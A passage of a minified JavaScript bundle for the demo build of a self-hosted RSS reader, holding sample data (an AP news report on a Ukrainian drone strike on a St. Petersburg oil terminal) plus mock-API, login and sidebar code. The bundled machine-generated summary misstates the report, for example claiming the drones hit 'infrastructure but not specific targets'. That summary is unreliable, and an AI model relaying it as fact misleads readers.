+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg" sizes="(min-width: 1025px) 650px, calc(100vw - 30px)" type="image/jpeg"/>
+            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg" alt="A plumes of black smoke is seen over the port of St. Petersburg, Russia, Wednesday, June 3, 2026, after a Ukrainian drone attack." fetchpriority="high"/>
+        </picture>
+</div>
+<div>
+    <div>
+        <p>
+                A plumes of black smoke is seen over the port of St. Petersburg, Russia, Wednesday, June 3, 2026, after a Ukrainian drone attack.
+                <b aria-label="Image credit">
+                    
+                    AP Photo
+                    
+                </b>
+                <b><b>hide caption</b></b>
+            </p>
+
+
+            <p><b><b>toggle caption</b></b>
+    </p></div>
+
+    <p><span aria-label="Image credit">
+        
+        AP Photo
+        
+    </span>
+</p></div>
+   </div>
+   <p>Ukrainian long-range drones struck an oil terminal in St. Petersburg and set it ablaze, Ukrainian President Volodymyr Zelenskyy said Wednesday, as the Russian city hosted an annual international economic forum promoted by President Vladimir Putin.</p>   
+   
+
+   <p>The drones flew more than 1,000 kilometers (600 miles) to hit the terminal, Zelenskyy said on social media. Clouds of black smoke rose over the city&#39;s port after the attack.</p>   <p>Russian authorities said only that the Ukrainian drone strike targeted the city&#39;s infrastructure, without providing further details. The airport of St. Petersburg briefly suspended flights overnight because of the attack. Authorities also cut off mobile internet services.</p>   <p>Putin is set to speak Friday at the economic forum in St. Petersburg that the Kremlin views as a prestige event, although major Western investors and officials have stayed away since Russia invaded Ukraine more than four years ago. Saudi Arabia is a special guest country this year and is due to send a large business delegation.</p>   
+   <p>The strikes are an embarrassment for Putin, weeks after he had to prune back an annual Victory Day parade in Moscow due to fears of Ukrainian drone attacks.</p>   <p>The strikes came a day after Russian forces launched a massive drone and missile attack on Kyiv and other Ukrainian cities, killing at least 22 civilians and wounding 138, as Moscow followed through with its threat of escalating its regular barrages.</p>   <p>With the front line changing little as swarms of drones hinder battlefield movement, both sides have sought an edge by increasingly launching long-range strikes. The war that followed Russia&#39;s invasion of its neighbor has now stretched into its fifth year, with no end in sight.</p>   
+   
+
+   <p>Ukraine&#39;s attacks are aimed at diminishing Russia&#39;s oil production, which is a key source of funding for Moscow, and disrupting weapon production.</p>   <p>Ukraine has repeatedly targeted oil facilities at the port of St. Petersburg and nearby ports.</p>   <p>Ukrainian drone attacks overnight also hit the Kronstadt naval base, an old base for Russia&#39;s Baltic Fleet, and a manufacturing plant involved in weapon production in Russia&#39;s Tambov region, 600 kilometers (370 miles) from Ukraine, Zelenskyy said.</p>   <p>Russia&#39;s Defense Ministry said that air defenses downed 354 Ukrainian drones overnight.</p>   <p>In the Russia-controlled part of Ukraine&#39;s Donetsk region, a Ukrainian strike hit a bus that was traveling from Moscow to Crimea, killing seven and injuring 11, according to the Kremlin-appointed head of Donetsk, Denis Pushilin.</p>   
+   <p>In the Smolensk region, two firefighters were killed by a Ukrainian drone attack, according to the regional governor, Vasily Anokhin. He said two other firefighters and a local resident were injured.</p>   <p>Meanwhile, Russia fired 198 long-range drones at Ukraine last night, according to Ukraine&#39;s air force, with air defenses neutralizing 189.</p>   
+   
+
+   <p>Authorities in Ukraine&#39;s northern Sumy region said that over the previous 24 hours one civilian was killed and 15 more were injured, including three children, by Russian strikes.</p>   <p>In the southern Kherson, Russian overnight shelling and drone strikes killed an 86-year-old woman and wounded five other people, according to regional authorities.</p>
+</div></div>`,content_text:`A plumes of black smoke is seen over the port of St. Petersburg, Russia, Wednesday, June 3, 2026, after a Ukrainian drone attack.
+                
+                    
+                    AP Photo
+                    
+                
+                hide caption
+            
+
+
+            toggle caption
+    
+
+    
+        
+        AP Photo
+        
+    
+
+   
+   Ukrainian long-range drones struck an oil terminal in St. Petersburg and set it ablaze, Ukrainian President Volodymyr Zelenskyy said Wednesday, as the Russian city hosted an annual international economic forum promoted by President Vladimir Putin.   
+   
+
+   The drones flew more than 1,000 kilometers (600 miles) to hit the terminal, Zelenskyy said on social media. Clouds of black smoke rose over the city's port after the attack.   Russian authorities said only that the Ukrainian drone strike targeted the city's infrastructure, without providing further details. The airport of St. Petersburg briefly suspended flights overnight because of the attack. Authorities also cut off mobile internet services.   Putin is set to speak Friday at the economic forum in St. Petersburg that the Kremlin views as a prestige event, although major Western investors and officials have stayed away since Russia invaded Ukraine more than four years ago. Saudi Arabia is a special guest country this year and is due to send a large business delegation.   
+   The strikes are an embarrassment for Putin, weeks after he had to prune back an annual Victory Day parade in Moscow due to fears of Ukrainian drone attacks.   The strikes came a day after Russian forces launched a massive drone and missile attack on Kyiv and other Ukrainian cities, killing at least 22 civilians and wounding 138, as Moscow followed through with its threat of escalating its regular barrages.   With the front line changing little as swarms of drones hinder battlefield movement, both sides have sought an edge by increasingly launching long-range strikes. The war that followed Russia's invasion of its neighbor has now stretched into its fifth year, with no end in sight.   
+   
+
+   Ukraine's attacks are aimed at diminishing Russia's oil production, which is a key source of funding for Moscow, and disrupting weapon production.   Ukraine has repeatedly targeted oil facilities at the port of St. Petersburg and nearby ports.   Ukrainian drone attacks overnight also hit the Kronstadt naval base, an old base for Russia's Baltic Fleet, and a manufacturing plant involved in weapon production in Russia's Tambov region, 600 kilometers (370 miles) from Ukraine, Zelenskyy said.   Russia's Defense Ministry said that air defenses downed 354 Ukrainian drones overnight.   In the Russia-controlled part of Ukraine's Donetsk region, a Ukrainian strike hit a bus that was traveling from Moscow to Crimea, killing seven and injuring 11, according to the Kremlin-appointed head of Donetsk, Denis Pushilin.   
+   In the Smolensk region, two firefighters were killed by a Ukrainian drone attack, according to the regional governor, Vasily Anokhin. He said two other firefighters and a local resident were injured.   Meanwhile, Russia fired 198 long-range drones at Ukraine last night, according to Ukraine's air force, with air defenses neutralizing 189.   
+   
+
+   Authorities in Ukraine's northern Sumy region said that over the previous 24 hours one civilian was killed and 15 more were injured, including three children, by Russian strikes.   In the southern Kherson, Russian overnight shelling and drone strikes killed an 86-year-old woman and wounded five other people, according to regional authorities.`,cleaned_html:`<p>Summary: Ukrainian drones strike a St. Petersburg oil terminal ahead of Putin's visit.<br>Points:<br>- Ukrainian drone attack on an oil terminal in St. Petersburg<br>- Drones flew over the city's port after striking a terminal<br>- Drones hit infrastructure but not specific targets<br>- No further details provided<br>- Attack was aimed at diminishing Russia's oil production and disrupting weapon production</p><p>Title: "Ukraine Strikes Terminal Amidst Putin Visit</p>`,summary:`Ukrainian drones strike a St. Petersburg oil terminal ahead of Putin's visit.
+
+• Ukrainian drone attack on an oil terminal in St. Petersburg
+• Drones flew over the city's port after striking a terminal
+• Drones hit infrastructure but not specific targets
+• No further details provided
+• Attack was aimed at diminishing Russia's oil production and disrupting weapon production`,summary_model:`qwen2.5:0.5b`,image_url:`https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/8640x5760!/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg`,published_at:1780481040,fetched_at:1780509343,content_hash:`b4604a09f7da05ed7768c5ecde358e431d58646e96f99ce9b4e12a9f18712387`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0}]},io=ut(!1);function ao(){io.set(!0)}var oo=!1,so=ro.captured_at||``,co={articles:structuredClone(ro.articles),feeds:structuredClone(ro.feeds)};function lo(e){let t=e.get(`view`)||``,n=e.get(`feed_id`),r=e.get(`category_id`),i=e.get(`board_id`),a=co.articles.slice();if(n)a=a.filter(e=>e.feed_id===Number(n));else if(r){let e=Number(r),t=new Set(co.feeds.filter(t=>t.category_id===e).map(e=>e.id));a=a.filter(e=>t.has(e.feed_id))}else if(i)a=[];else switch(t){case`starred`:a=a.filter(e=>e.is_starred);break;case`later`:a=a.filter(e=>e.is_later);break;case`shared`:a=[];break;case`fresh`:case`today`:case`unread`:a=a.filter(e=>!e.is_read);break;default:break}return a.sort((e,t)=>{let n=e.published_at??0,r=t.published_at??0;return r===n?t.id-e.id:r-n})}function uo(){return{fresh:co.articles.filter(e=>!e.is_read).length,starred:co.articles.filter(e=>e.is_starred).length,later:co.articles.filter(e=>e.is_later).length,shared:0,pending_summary:0}}function fo(){return co.feeds.map(e=>({...e,unread:co.articles.filter(t=>t.feed_id===e.id&&!t.is_read).length}))}function po(e,t,n,r){let i=(e,t)=>({status:200,data:e,meta:t}),a=()=>({status:204});if(t===`/api/me`&&e===`GET`)return oo?i(ro.me):{status:401};if(t===`/api/auth/login`&&e===`POST`)return oo=!0,i(ro.me.user);if(t===`/api/auth/logout`)return oo=!1,a();if(t===`/api/auth/passkey/exists`)return i({any_registered:!1});if(t===`/api/users`&&e===`GET`||t===`/api/shares/inbox`&&e===`GET`)return i([]);if(t===`/api/branding`)return i(ro.branding);if(t===`/api/categories`&&e===`GET`)return i(ro.categories);if(t===`/api/feeds`&&e===`GET`)return i(fo());if(t===`/api/boards`&&e===`GET`)return i(ro.boards);if(t===`/api/filters`&&e===`GET`)return i(ro.filters);if(t===`/api/saved-searches`&&e===`GET`)return i(ro.savedSearches);if(t===`/api/tags`&&e===`GET`)return i(ro.tags);if(t===`/api/starter-packs`&&e===`GET`)return i(ro.starterPacks);if(t===`/api/me/smart-counts`)return i(uo());if(t===`/api/me/stats`)return i(ro.stats);if(t===`/api/articles`&&e===`GET`)return i(lo(n));let o=t.match(/^\/api\/articles\/(\d+)$/);if(o&&e===`GET`){let e=co.articles.find(e=>e.id===Number(o[1]));return e?i(e):{status:404}}if(t.match(/^\/api\/articles\/\d+\/cluster$/))return i({siblings:[]});if(t.match(/^\/api\/articles\/\d+\/tags$/)&&e===`GET`)return i([]);if(t===`/api/articles/read`&&e===`POST`){let e=new Set(r?.ids||[]),t=!!r?.read;return co.articles.forEach(n=>{e.has(n.id)&&(n.is_read=t)}),i({count:e.size})}if(t===`/api/articles/star`&&e===`POST`){let e=co.articles.find(e=>e.id===Number(r?.id));return e&&(e.is_starred=!!r?.value),a()}if(t===`/api/articles/later`&&e===`POST`){let e=co.articles.find(e=>e.id===Number(r?.id));return e&&(e.is_later=!!r?.value),a()}if(t===`/api/articles/mark-all-read`&&e===`POST`){let e=new URLSearchParams;r?.feed_id?e.set(`feed_id`,String(r.feed_id)):r?.category_id?e.set(`category_id`,String(r.category_id)):r?.view&&e.set(`view`,String(r.view));let t=lo(e);return t.forEach(e=>{let t=co.articles.find(t=>t.id===e.id);t&&(t.is_read=!0)}),i({count:t.length})}if(t.match(/^\/api\/articles\/\d+\/extract$/))return i({status:`no_change`},{status:`no_change`});if(t===`/api/search`&&e===`GET`){let e=(n.get(`q`)||``).toLowerCase();return i(e?co.articles.filter(t=>t.title.toLowerCase().includes(e)||(t.content_text||``).toLowerCase().includes(e)||(t.summary||``).toLowerCase().includes(e)).slice(0,Number(n.get(`limit`)||30)).map((e,t)=>({...e,rank:-t})):[])}return t.match(/^\/api\/articles\/\d+\/tags$/)?i([]):t.match(/^\/api\/boards\/\d+\/articles/)?a():t===`/api/saved-searches`&&e===`POST`?i({id:Date.now()%1e5,user_id:1,name:String(r?.name??``),query:String(r?.query??``),created_at:0}):t.match(/^\/api\/saved-searches\/\d+$/)&&e===`DELETE`||t===`/api/categories/reorder`||t===`/api/feeds/reorder`||t.match(/^\/api\/feeds\/\d+\/refresh$/)?a():t===`/api/filters/preview`?i({count:0}):e===`GET`?i(mo(t)):(ao(),i({}))}function mo(e){return e===`/api/me/digest`?{user_id:1,enabled:!1,view_kind:`smart`,view_value:`fresh`,hour_utc:7,minute_utc:0,last_sent_at:0,email_override:``}:e===`/api/me/inbox`?{handle:``,address:``,domain:``,enabled:!1}:e===`/api/me/passkeys`||e===`/api/me/push-subscriptions`?[]:{}}function ho(e){return e.status===204?new Response(null,{status:204}):e.status>=400?new Response(JSON.stringify({error:{code:`demo`,message:`unavailable in demo`}}),{status:e.status,headers:{"Content-Type":`application/json`}}):new Response(JSON.stringify({data:e.data,meta:e.meta}),{status:e.status,headers:{"Content-Type":`application/json`}})}function go(){Qi.set(100*365*24*3600);let e=window.fetch.bind(window);window.fetch=async(t,n)=>{let r=typeof t==`string`?t:t instanceof URL?t.href:t.url,i;try{i=new URL(r,location.origin)}catch{return e(t,n)}if(!i.pathname.startsWith(`/api/`))return e(t,n);let a=(n?.method||`GET`).toUpperCase(),o;if(n?.body&&typeof n.body==`string`)try{o=JSON.parse(n.body)}catch{}return await new Promise(e=>setTimeout(e,40)),ho(po(a,i.pathname,i.searchParams,o))}}var _o=U(`<p class="login-error svelte-h34f85" data-testid="login-error"> </p>`),vo=U(`<div class="or svelte-h34f85">or</div> <button type="button" class="btn-secondary svelte-h34f85" data-testid="login-passkey"> </button>`,1),yo=U(`<div id="login" class="svelte-h34f85"><div class="login-brand svelte-h34f85"><div class="mark svelte-h34f85"><svg width="28" height="28" viewBox="0 0 64 64" aria-hidden="true"><defs><linearGradient id="login-mark-emb" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="var(--ember-soft)"></stop><stop offset="1" stop-color="var(--ember)"></stop></linearGradient></defs><circle cx="13" cy="15" r="6.5" fill="url(#login-mark-emb)"></circle><rect x="25" y="11.5" width="31" height="8" rx="4" fill="var(--paper)"></rect><rect x="8" y="28" width="48" height="8" rx="4" fill="var(--paper)"></rect><rect x="8" y="44.5" width="34" height="8" rx="4" fill="url(#login-mark-emb)"></rect></svg> Ember</div> <div class="message svelte-h34f85"><h1 class="svelte-h34f85">Your feeds, <em class="svelte-h34f85">distilled</em> and self&#8209;hosted.</h1> <p class="svelte-h34f85">A calm, single-binary RSS reader. Folders like Feedly, story cards like
+        Kite, summaries from a local model that never leaves your server.</p></div> <div class="foot svelte-h34f85">SELF-HOSTED · GO · NO TRACKING</div></div> <div class="login-form svelte-h34f85"><form class="login-card svelte-h34f85"><h2 class="svelte-h34f85">Welcome back</h2> <div class="sub svelte-h34f85">Sign in to your reading space.</div> <div class="field svelte-h34f85"><label for="login-username" class="svelte-h34f85">Username</label> <input id="login-username" type="text" autocomplete="username" data-testid="username" class="svelte-h34f85"/></div> <div class="field svelte-h34f85"><label for="login-password" class="svelte-h34f85">Password</label> <input id="login-password" type="password" autocomplete="current-password" data-testid="password" class="svelte-h34f85"/></div> <!> <button class="btn-primary svelte-h34f85" type="submit" data-testid="login-submit"> </button> <!> <div class="login-meta svelte-h34f85">Multi-user · ask your admin for an invite</div></form></div></div>`);function bo(e,t){qe(t,!0);let n=()=>M(Yi,`$user`,r),[r,i]=gt(),a=P(``),o=P(``),s=P(``),c=P(!1),l=P(!1),u=P(void 0);Vn(()=>{V(u)?.focus()});let d=no(),f=P(!1);Gi(async()=>{F(a,`demo`),F(o,`demo`),setTimeout(()=>{!V(c)&&!n()&&m(new Event(`submit`))},15e3)});let p=Qt(()=>d&&V(f));async function m(e){if(e.preventDefault(),!(!V(a)||!V(o))){F(c,!0),F(s,``);try{await ea(V(a),V(o))}catch(e){e instanceof Z&&e.status===401?F(s,`Invalid username or password`):F(s,String(e),!0)}finally{F(c,!1)}}}async function h(){if(!V(a)){F(s,`Type your username first`);return}F(l,!0),F(s,``);try{let e=await $.passkeyLoginBegin(V(a)),t=await to(e.data.options);await $.passkeyLoginFinish(e.data.session_id,t),await $i()}catch(e){e instanceof Z?F(s,e.message||`Passkey sign-in failed`,!0):e instanceof DOMException?F(s,`Passkey sign-in cancelled`):F(s,String(e),!0)}finally{F(l,!1)}}var g=yo(),_=R(I(g),2),v=I(_),y=R(I(v),4),b=R(I(y),2);J(b),zi(b,e=>F(u,e),()=>V(u)),j(y);var x=R(y,2),S=R(I(x),2);J(S),j(x);var C=R(x,2),w=e=>{var t=_o(),n=I(t,!0);j(t),z(()=>G(n,V(s))),W(e,t)};K(C,e=>{V(s)&&e(w)});var ee=R(C,2),te=I(ee,!0);j(ee);var T=R(ee,2),E=e=>{var t=vo(),n=R(L(t),2),r=I(n,!0);j(n),z(()=>{n.disabled=V(l)||!V(a),G(r,V(l)?`Waiting for passkey…`:`Sign in with passkey`)}),H(`click`,n,h),W(e,t)};K(T,e=>{V(p)&&e(E)}),Ie(2),j(v),j(_),j(g),z(()=>{ee.disabled=V(c),G(te,V(c)?`Signing in…`:`Sign in`)}),X(b,()=>V(a),e=>F(a,e)),X(S,()=>V(o),e=>F(o,e)),H(`submit`,v,m),W(e,g),Je(),i()}var xo=U(`<div class="backdrop svelte-1efofyg" role="dialog" aria-modal="true" aria-labelledby="confirm-title" data-testid="confirm-dialog"><div class="card svelte-1efofyg"><h3 id="confirm-title" class="svelte-1efofyg"> </h3> <p class="msg svelte-1efofyg"> </p> <div class="actions svelte-1efofyg"><button type="button" class="ghost svelte-1efofyg" data-testid="confirm-cancel"> </button> <button type="button" data-testid="confirm-ok"> </button></div></div></div>`);function So(e,t){qe(t,!0);let n=Wi(t,`title`,3,`Are you sure?`),r=Wi(t,`confirmLabel`,3,`Confirm`),i=Wi(t,`cancelLabel`,3,`Cancel`),a=Wi(t,`destructive`,3,!1),o=Wi(t,`busy`,3,!1);function s(e){e.key===`Escape`&&t.onCancel(),e.key===`Enter`&&t.onConfirm()}var c=xo();H(`keydown`,vn,s);var l=I(c),u=I(l),d=I(u,!0);j(u);var f=R(u,2),p=I(f,!0);j(f);var m=R(f,2),h=I(m),g=I(h,!0);j(h);var _=R(h,2);let v;var y=I(_,!0);j(_),j(m),j(l),j(c),z(()=>{G(d,n()),G(p,t.message),G(g,i()),_.disabled=o(),v=q(_,1,`svelte-1efofyg`,null,v,{destructive:a()}),G(y,o()?`Working…`:r())}),H(`click`,h,function(...e){t.onCancel?.apply(this,e)}),H(`click`,_,function(...e){t.onConfirm?.apply(this,e)}),H(`click`,l,Bi(function(e){Ui.call(this,t,e)})),H(`click`,c,function(...e){t.onCancel?.apply(this,e)}),W(e,c),Je()}var Co=U(`<span class="error-tag svelte-181dlmc" aria-label="feed errored">!</span>`),wo=U(`<span class="muted-tag svelte-181dlmc" aria-label="muted">🔕</span>`),To=U(`<span class="badge svelte-181dlmc"> </span>`),Eo=U(`<div class="feed-menu svelte-181dlmc"><button class="svelte-181dlmc">Mark feed read</button> <button class="svelte-181dlmc"> </button> <button class="svelte-181dlmc">Resummarize</button> <button class="danger svelte-181dlmc">Delete</button></div>`),Do=U(`<div draggable="true"><button><span class="favicon svelte-181dlmc"> </span> <span class="ni-label svelte-181dlmc"> </span> <!> <!> <!></button> <button class="feed-actions-trigger svelte-181dlmc" data-feed-actions-trigger="" aria-label="Feed actions" title="More"><svg viewBox="0 0 24 24" width="14" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><circle cx="12" cy="5" r="1" class="svelte-181dlmc"></circle><circle cx="12" cy="12" r="1" class="svelte-181dlmc"></circle><circle cx="12" cy="19" r="1" class="svelte-181dlmc"></circle></svg></button> <!></div>`),Oo=U(`<span class="badge svelte-181dlmc" data-testid="badge-fresh"> </span>`),ko=U(`<span class="badge svelte-181dlmc"> </span>`),Ao=U(`<span class="badge svelte-181dlmc" data-testid="badge-starred"> </span>`),jo=U(`<span class="badge svelte-181dlmc" data-testid="badge-later"> </span>`),Mo=U(`<span class="badge svelte-181dlmc" data-testid="badge-shared"> </span>`),No=U(`<input class="folder-rename svelte-181dlmc"/>`),Po=U(`<button> </button>`),Fo=U(`<span class="badge svelte-181dlmc"> </span>`),Io=U(`<div class="folder-menu svelte-181dlmc"><button class="svelte-181dlmc">Rename</button> <button class="svelte-181dlmc">Color…</button> <button class="danger svelte-181dlmc">Delete</button></div>`),Lo=U(`<button class="swatch svelte-181dlmc"></button>`),Ro=U(`<div class="folder-color-picker svelte-181dlmc"></div>`),zo=U(`<div><div class="folder-head svelte-181dlmc" draggable="true"><button class="chev-btn svelte-181dlmc" aria-label="Toggle folder"><svg class="chev svelte-181dlmc" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 9l6 6 6-6" class="svelte-181dlmc"></path></svg></button> <span class="dot svelte-181dlmc"></span> <!> <!> <button class="folder-actions-trigger svelte-181dlmc" data-cat-actions-trigger="" aria-label="Folder actions"><svg viewBox="0 0 24 24" width="13" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><circle cx="12" cy="5" r="1" class="svelte-181dlmc"></circle><circle cx="12" cy="12" r="1" class="svelte-181dlmc"></circle><circle cx="12" cy="19" r="1" class="svelte-181dlmc"></circle></svg></button> <!> <!></div> <div class="feed-list svelte-181dlmc"></div></div>`),Bo=U(`<div><div class="folder-head svelte-181dlmc"><button class="chev-btn svelte-181dlmc" aria-label="Toggle folder"><svg class="chev svelte-181dlmc" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 9l6 6 6-6" class="svelte-181dlmc"></path></svg></button> <span class="dot svelte-181dlmc" style="background:#8c8273"></span> <span class="folder-name svelte-181dlmc">Uncategorized</span></div> <div class="feed-list svelte-181dlmc"></div></div>`),Vo=U(`<button class="add-btn svelte-181dlmc" data-testid="open-add-feed"><svg viewBox="0 0 24 24" width="14" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><path d="M12 5v14M5 12h14" class="svelte-181dlmc"></path></svg> Add feed</button>`),Ho=U(`<p class="add-error svelte-181dlmc"> </p>`),Uo=U(`<form class="add-form svelte-181dlmc"><input type="url" placeholder="https://example.com/feed.xml" data-testid="add-feed-input" class="svelte-181dlmc"/> <div class="add-form-actions svelte-181dlmc"><button type="button" class="ghost svelte-181dlmc">Cancel</button> <button type="submit" data-testid="add-feed-submit" class="svelte-181dlmc"> </button></div> <!></form>`),Wo=U(`<form class="add-form add-form-board svelte-181dlmc"><input type="text" placeholder="Name (e.g. 'rust news')" data-testid="add-search-name" class="svelte-181dlmc"/> <input type="text" placeholder="Query — FTS5 syntax" data-testid="add-search-query" class="svelte-181dlmc"/> <div class="add-form-actions svelte-181dlmc"><button type="button" class="ghost svelte-181dlmc">Cancel</button> <button type="submit" data-testid="add-search-submit" class="svelte-181dlmc"> </button></div></form>`),Go=U(`<div class="feed-row board-row svelte-181dlmc"><button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><circle cx="11" cy="11" r="7" class="svelte-181dlmc"></circle><path d="M21 21l-4-4" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc"> </span></button> <button class="board-delete svelte-181dlmc" aria-label="Delete saved search" title="Delete saved search">×</button></div>`),Ko=U(`<form class="add-form add-form-board svelte-181dlmc"><input type="text" placeholder="Board name" data-testid="add-board-input" class="svelte-181dlmc"/> <div class="add-form-actions svelte-181dlmc"><button type="button" class="ghost svelte-181dlmc">Cancel</button> <button type="submit" data-testid="add-board-submit" class="svelte-181dlmc"> </button></div></form>`),qo=U(`<div class="feed-row board-row svelte-181dlmc"><button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><rect x="3" y="3" width="7" height="7" rx="1" class="svelte-181dlmc"></rect><rect x="14" y="3" width="7" height="7" rx="1" class="svelte-181dlmc"></rect><rect x="3" y="14" width="7" height="7" rx="1" class="svelte-181dlmc"></rect></svg></span> <span class="ni-label svelte-181dlmc"> </span></button> <button class="board-delete svelte-181dlmc" aria-label="Delete board" title="Delete board">×</button></div>`),Jo=U(`<div class="summarizing svelte-181dlmc" data-testid="sidebar-summarizing"><span class="summarizing-dot svelte-181dlmc" aria-hidden="true"></span> <span class="summarizing-label svelte-181dlmc"> </span></div>`),Yo=U(`<aside class="rail svelte-181dlmc"><div class="rail-scroll svelte-181dlmc"><div class="rail-section svelte-181dlmc"><button title="Articles published since midnight server time"><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc">Today</span></button> <button data-testid="view-fresh"><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><path d="M13 2L3 14h9l-1 8 10-12h-9z" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc">Fresh</span> <!></button> <button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><circle cx="12" cy="12" r="9" class="svelte-181dlmc"></circle></svg></span> <span class="ni-label svelte-181dlmc">All Unread</span> <!></button> <button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><path d="M12 2l3 6.3 6.9 1-5 4.9 1.2 6.8L12 17.8 5.9 21l1.2-6.8-5-4.9 6.9-1z" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc">Starred</span> <!></button> <button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc">Read Later</span> <!></button> <button><span class="ni-icon svelte-181dlmc"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-181dlmc"><circle cx="18" cy="5" r="3" class="svelte-181dlmc"></circle><circle cx="6" cy="12" r="3" class="svelte-181dlmc"></circle><circle cx="18" cy="19" r="3" class="svelte-181dlmc"></circle><path d="M8.6 13.5l6.8 4M15.4 6.5l-6.8 4" class="svelte-181dlmc"></path></svg></span> <span class="ni-label svelte-181dlmc">Shared with me</span> <!></button></div> <div class="rail-section svelte-181dlmc"><div class="rail-head svelte-181dlmc"><h3 class="svelte-181dlmc">Folders</h3></div> <!> <!> <div class="add-row svelte-181dlmc"><!></div></div> <div class="rail-section svelte-181dlmc"><div class="rail-head svelte-181dlmc"><h3 class="svelte-181dlmc">Saved searches</h3> <button class="head-add svelte-181dlmc" aria-label="New saved search" title="Save a search" data-testid="open-add-search">+</button></div> <!> <!></div> <div class="rail-section svelte-181dlmc"><div class="rail-head svelte-181dlmc"><h3 class="svelte-181dlmc">Boards</h3> <button class="head-add svelte-181dlmc" aria-label="New board" title="New board" data-testid="open-add-board">+</button></div> <!> <!></div></div> <!></aside> <!>`,1);function Xo(e,t){qe(t,!0);let n=()=>M(da,`$activeView`,l),r=()=>M(na,`$feeds`,l),i=()=>M(ra,`$categories`,l),a=()=>M(sa,`$smartCounts`,l),o=()=>M(ua,`$totalUnread`,l),s=()=>M(aa,`$savedSearches`,l),c=()=>M(ia,`$boards`,l),[l,u]=gt(),f=(e,t=d)=>{var n=Do();let r;var i=I(n);let a;var o=I(i),s=I(o,!0);j(o);var c=R(o,2),l=I(c,!0);j(c);var u=R(c,2),f=e=>{var n=Co();z(()=>Y(n,`title`,`${t().error_count} consecutive errors: ${t().last_error||`unknown`}`)),W(e,n)};K(u,e=>{(t().error_count??0)>=3&&e(f)});var p=R(u,2),m=e=>{W(e,wo())};K(p,e=>{t().muted&&e(m)});var h=R(p,2),g=e=>{var n=To(),r=I(n,!0);j(n),z(()=>G(r,t().unread)),W(e,n)};K(h,e=>{t().unread>0&&!t().muted&&e(g)}),j(i);var _=R(i,2),v=R(_,2),y=e=>{var n=Eo(),r=I(n),i=R(r,2),a=I(i,!0);j(i);var o=R(i,2),s=R(o,2);j(n),z(()=>{Y(n,`data-feed-menu-for`,t().id),Y(r,`data-testid`,`feed-mark-read-${t().id??``}`),Y(i,`data-testid`,`feed-mute-${t().id??``}`),G(a,t().muted?`Unmute`:`Mute`),Y(o,`data-testid`,`feed-resummarize-${t().id??``}`),Y(s,`data-testid`,`feed-delete-${t().id??``}`)}),H(`click`,r,()=>ce(t())),H(`click`,i,()=>ie(t())),H(`click`,o,()=>se(t())),H(`click`,s,()=>ae(t())),W(e,n)};K(v,e=>{V(te)===t().id&&e(y)}),j(n),z((e,c,u,d)=>{r=q(n,1,`feed-row svelte-181dlmc`,null,r,e),a=q(i,1,`feed-item 